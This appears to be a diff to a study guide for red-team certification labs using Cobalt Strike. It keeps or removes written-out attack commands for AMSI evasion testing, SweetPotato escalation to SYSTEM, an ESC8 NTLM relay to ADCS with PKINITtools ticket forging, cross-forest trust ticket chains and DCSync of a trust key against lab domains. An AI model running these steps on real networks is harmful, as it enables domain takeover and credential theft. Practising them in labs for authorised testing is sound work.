@@ -28,8 +28,6 @@ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
 C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
 ```
 
-Lab file: `labs/defence-evasion-lab-Malleable.md`
-
 ---
 
 ### 2. [SQL Servers lab](/labs/SQL-Servers-lab.md)
@@ -50,22 +48,9 @@ Six documented ⚠️ traps — all from hard experience. The `42000 permission 
 - SweetPotato upload path: `C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\`
 - `connect localhost 1337` to link tcp-local SYSTEM beacon after SweetPotato fires
 
-Lab file: `labs/SQL-Servers-lab.md`
-
 ---
 
-### 3. ESC8 — NTLM Relay to ADCS
-
-Most tool-specific lab in the course. Confirm hands-on that `certipy` is NOT in the Kali Docker image and that PKINITtools is the right path.
-
-**Tool chain:**
-```bash
-# Kali Docker path (recommended)
-proxychains python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx LON-DC-1.pfx CONTOSO.COM/'LON-DC-1$' LON-DC-1.ccache
-export KRB5CCNAME=LON-DC-1.ccache
-proxychains python3 /opt/PKINITtools/getnthash.py -key <AS-REP_key> CONTOSO.COM/'LON-DC-1$'
-proxychains python3 /opt/PKINITtools/gets4uticket.py -spn 'cifs/lon-dc-1.contoso.com' -impersonate Administrator CONTOSO.COM/'LON-DC-1$' Administrator.ccache
-```
+### 3. [ESC8 NTLM Relay to ADCS](/labs/esc8.md)  
 
 **Setup order (strict):**
 1. `socks 1080 socks5` on beacon
@@ -79,11 +64,10 @@ proxychains python3 /opt/PKINITtools/gets4uticket.py -spn 'cifs/lon-dc-1.contoso
 
 Practice this until the relay fires in under 10 minutes. Cleanup: restore services, stop SOCKS, stop rportfwd, remove firewall rule.
 
-Lab file: `labs/esc8.md`
-
+**incomplete final steps not verified**
 ---
 
-### 4. Forest Trusts — Inbound + Outbound
+### 4. [Forest Trusts — Inbound](/labs/Inbound-Trusts-lab.md)
 
 The 3-ticket referral chain and the separate `http/` ticket requirement for `jump winrm64` are the exam traps specifically flagged in the lessons-learned document.
 
@@ -100,13 +84,12 @@ The 3-ticket referral chain and the separate `http/` ticket requirement for `jum
 7. kerberos_ticket_use <http.kirbi> → jump winrm64 par-jmp-1.partner.com smb
 ```
 
-**Outbound trust — TDO DCSync:**
+**[Outbound trust — TDO DCSync](labs/Outbound-Trusts-lab.md)**  
 ```cs
 beacon> ldapsearch "(&(objectClass=trustedDomain)(trustPartner=contoso.com))" --attributes objectGuid
 beacon> dcsync PARTNER\<TDO-GUID>    // extracts RC4/AES inter-realm trust key — note the GUID syntax
 ```
 
-Lab files: `labs/Inbound-Trusts-lab.md`, `labs/Outbound-Trusts-lab.md`
 
 ---
 
